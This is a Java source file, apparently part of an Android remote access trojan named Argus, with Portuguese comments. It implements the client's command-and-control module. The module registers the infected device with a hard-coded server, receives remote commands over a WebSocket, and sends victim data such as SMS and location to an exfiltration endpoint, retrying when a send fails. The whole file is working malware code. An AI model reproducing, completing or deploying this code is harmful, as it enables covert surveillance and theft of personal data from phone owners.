package com.argus.rat;

import android.content.Context;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import okhttp3.*;
import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Cliente unificado para comunicação com servidor C2
 * Gerencia HTTP requests, WebSocket, criptografia e retry logic
 */
public class C2Client {
    private static final String TAG = "C2Client";
    private static C2Client instance;
    
    // Configurações do servidor C2 (alterar para seu servidor)
    private static String C2_SERVER_URL = "http://192.168.1.100:5000";
    private static String C2_WEBSOCKET_URL = "ws://192.168.1.100:5000";
    
    // Chave de criptografia (usar variável de ambiente em produção)
    private static final String ENCRYPTION_KEY = "ArgusC2SecureKey2024!@#";
    
    private final Context context;
    private final OkHttpClient httpClient;
    private final Gson gson;
    private WebSocketClient webSocketClient;
    private DataExfiltrationManager exfiltrationManager;
    private C2Listener listener;
    private String deviceId;
    
    // Singleton pattern
    private C2Client(Context context) {
        this.context = context.getApplicationContext();
        this.gson = new Gson();
        
        // Configurar HTTP client com timeouts adequados
        this.httpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30, TimeUnit.SECONDS)
                .retryOnConnectionFailure(true)
                .build();
        
        Log.i(TAG, "C2Client inicializado");
    }
    
    public static synchronized C2Client getInstance(Context context) {
        if (instance == null) {
            instance = new C2Client(context);
        }
        return instance;
    }
    
    /**
     * Configura URLs do servidor C2
     */
    public void setServerUrls(String httpUrl, String wsUrl) {
        C2_SERVER_URL = httpUrl;
        C2_WEBSOCKET_URL = wsUrl;
        Log.i(TAG, "URLs do servidor configuradas: HTTP=" + httpUrl + ", WS=" + wsUrl);
    }
    
    /**
     * Define listener para eventos do C2
     */
    public void setListener(C2Listener listener) {
        this.listener = listener;
    }
    
    /**
     * Inicializa conexão com servidor C2
     */
    public void initialize(String deviceId) {
        this.deviceId = deviceId;
        
        // Inicializar gerenciador de exfiltração
        exfiltrationManager = DataExfiltrationManager.getInstance(context);
        exfiltrationManager.start();
        
        // Registrar dispositivo no servidor
        registerDevice();
        
        // Conectar WebSocket
        connectWebSocket();
        
        Log.i(TAG, "C2Client inicializado para dispositivo: " + deviceId);
    }
    
    /**
     * Registra dispositivo no servidor C2
     */
    private void registerDevice() {
        new Thread(() -> {
            try {
                JsonObject deviceInfo = new JsonObject();
                deviceInfo.addProperty("device_id", deviceId);
                deviceInfo.addProperty("model", android.os.Build.MODEL);
                deviceInfo.addProperty("manufacturer", android.os.Build.MANUFACTURER);
                deviceInfo.addProperty("android_version", android.os.Build.VERSION.RELEASE);
                deviceInfo.addProperty("api_level", android.os.Build.VERSION.SDK_INT);
                deviceInfo.addProperty("app_version", "1.0.0");
                
                String jsonBody = gson.toJson(deviceInfo);
                
                // Criptografar dados
                String encryptedData = EncryptionUtils.encrypt(jsonBody, ENCRYPTION_KEY);
                
                RequestBody body = RequestBody.create(
                    MediaType.parse("application/octet-stream"),
                    encryptedData
                );
                
                Request request = new Request.Builder()
                    .url(C2_SERVER_URL + "/api/device/register")
                    .post(body)
                    .addHeader("Content-Type", "application/octet-stream")
                    .addHeader("X-Device-ID", deviceId)
                    .build();
                
                Response response = httpClient.newCall(request).execute();
                
                if (response.isSuccessful()) {
                    Log.i(TAG, "Dispositivo registrado com sucesso no C2");
                    if (listener != null) {
                        String responseBody = response.body() != null ? response.body().string() : "{}";
                        String decrypted = EncryptionUtils.decrypt(responseBody, ENCRYPTION_KEY);
                        listener.onDeviceRegistered(gson.fromJson(decrypted, JsonObject.class));
                    }
                } else {
                    Log.e(TAG, "Erro ao registrar dispositivo: " + response.code());
                }
                
                response.close();
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao registrar dispositivo", e);
                if (listener != null) {
                    listener.onError(e);
                }
            }
        }).start();
    }
    
    /**
     * Conecta ao WebSocket para comunicação em tempo real
     */
    private void connectWebSocket() {
//        webSocketClient = new WebSocketClient(context, C2_WEBSOCKET_URL, deviceId);
        webSocketClient = new WebSocketClient(context);

        webSocketClient.setListener(new WebSocketClient.WebSocketListener() {
            @Override
            public void onConnected() {
                Log.i(TAG, "WebSocket conectado");
                if (listener != null) {
                    listener.onConnected();
                }
            }
            
            @Override
            public void onDisconnected() {
                Log.w(TAG, "WebSocket desconectado");
                if (listener != null) {
                    listener.onDisconnected();
                }
            }
            
            @Override
            public void onCommandReceived(String commandId, String commandType, JsonObject data) {
                Log.i(TAG, "Comando recebido: " + commandType + " (ID: " + commandId + ")");
                if (listener != null) {
                    listener.onCommandReceived(commandId, commandType, data);
                }
            }

            @Override
            public void onCommandUpdated(String commandId, String status) {

            }

            @Override
            public void onMessageReceived(String event, JsonObject data) {
                if (listener != null) {
                    listener.onMessageReceived(event, data);
                }
            }
            
            @Override
            public void onError(Throwable error) {
                Log.e(TAG, "Erro no WebSocket: " + error.getMessage());
                if (listener != null) {
                    listener.onError(error);
                }
            }
        });
        
        webSocketClient.connect("");
    }
    
    /**
     * Exfiltra dados para servidor C2 (SMS, localização, etc.)
     */
    public void exfiltrateData(String dataType, String jsonData) {
        exfiltrateData(dataType, jsonData, null);
    }
    
    /**
     * Exfiltra dados para servidor C2 com callback
     */
    public void exfiltrateData(String dataType, String jsonData, final ExfiltrationCallback callback) {
        Log.d(TAG, "Exfiltrando dados: " + dataType);
        
        new Thread(() -> {
            try {
                // Criar payload
                JsonObject payload = new JsonObject();
                payload.addProperty("device_id", deviceId);
                payload.addProperty("data_type", dataType);
                payload.add("data", gson.fromJson(jsonData, JsonObject.class));
                payload.addProperty("timestamp", System.currentTimeMillis());
                
                String payloadJson = gson.toJson(payload);
                
                // Criptografar
                String encrypted = EncryptionUtils.encrypt(payloadJson, ENCRYPTION_KEY);
                
                RequestBody body = RequestBody.create(
                    MediaType.parse("application/octet-stream"),
                    encrypted
                );
                
                Request request = new Request.Builder()
                    .url(C2_SERVER_URL + "/api/data/exfiltrate")
                    .post(body)
                    .addHeader("Content-Type", "application/octet-stream")
                    .addHeader("X-Device-ID", deviceId)
                    .build();
                
                Response response = httpClient.newCall(request).execute();
                
                if (response.isSuccessful()) {
                    Log.i(TAG, "Dados exfiltrados com sucesso: " + dataType);
                    if (callback != null) {
                        callback.onSuccess();
                    }
                } else {
                    Log.e(TAG, "Erro ao exfiltrar dados: " + response.code());
                    if (callback != null) {
                        callback.onError(new IOException("HTTP " + response.code()));
                    }
                    
                    // Adicionar à fila para retry
                    if (exfiltrationManager != null) {
                        exfiltrationManager.queueData(dataType, jsonData);
                    }
                }
                
                response.close();
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao exfiltrar dados: " + dataType, e);
                if (callback != null) {
                    callback.onError(e);
                }
                
                // Adicionar à fila para retry
                if (exfiltrationManager != null) {
                    exfiltrationManager.queueData(dataType, jsonData);
                }
            }
        }).start();
    }
    
    /**
     * Envia resultado de comando executado
     */
    public void sendCommandResult(String commandId, boolean success, String message, JsonObject data) {
        new Thread(() -> {
            try {
                JsonObject result = new JsonObject();
                result.addProperty("command_id", commandId);
                result.addProperty("device_id", deviceId);
                result.addProperty("success", success);
                result.addProperty("message", message);
                result.addProperty("timestamp", System.currentTimeMillis());
                
                if (data != null) {
                    result.add("data", data);
                }
                
                String resultJson = gson.toJson(result);
                String encrypted = EncryptionUtils.encrypt(resultJson, ENCRYPTION_KEY);
                
                RequestBody body = RequestBody.create(
                    MediaType.parse("application/octet-stream"),
                    encrypted
                );
                
                Request request = new Request.Builder()
                    .url(C2_SERVER_URL + "/api/command/" + commandId + "/result")
                    .post(body)
                    .addHeader("Content-Type", "application/octet-stream")
                    .addHeader("X-Device-ID", deviceId)
                    .build();
                
                Response response = httpClient.newCall(request).execute();
                
                if (response.isSuccessful()) {
                    Log.i(TAG, "Resultado do comando enviado: " + commandId);
                } else {
                    Log.e(TAG, "Erro ao enviar resultado: " + response.code());
                }
                
                response.close();
                
            } catch (Exception e) {
                Log.e(TAG, "Erro ao enviar resultado do comando", e);
            }
        }).start();
    }
    
    /**
     * Envia heartbeat para manter conexão ativa
     */
    public void sendHeartbeat() {
        if (webSocketClient != null) {
            webSocketClient.sendHeartbeat();
        }
    }
    
    /**
     * Desconecta do servidor C2
     */
    public void disconnect() {
        if (webSocketClient != null) {
            webSocketClient.disconnect();
        }
        
        if (exfiltrationManager != null) {
            exfiltrationManager.stop();
        }
        
        Log.i(TAG, "C2Client desconectado");
    }
    
    /**
     * Verifica se está conectado
     */
    public boolean isConnected() {
        return webSocketClient != null && webSocketClient.isConnected();
    }
    
    // ==================== INTERFACES ====================
    
    /**
     * Listener para eventos do C2Client
     */
    public interface C2Listener {
        void onConnected();
        void onDisconnected();
        void onError(Throwable error);
        void onDeviceRegistered(JsonObject data);
        void onCommandReceived(String commandId, String commandType, JsonObject data);
        void onCommandUpdated(JsonObject data);
        void onCommandsReceived(com.google.gson.JsonArray commands);
        void onMessageReceived(String event, JsonObject data);
    }
    
    /**
     * Callback para exfiltração de dados
     */
    public interface ExfiltrationCallback {
        void onSuccess();
        void onError(Exception e);
    }
}

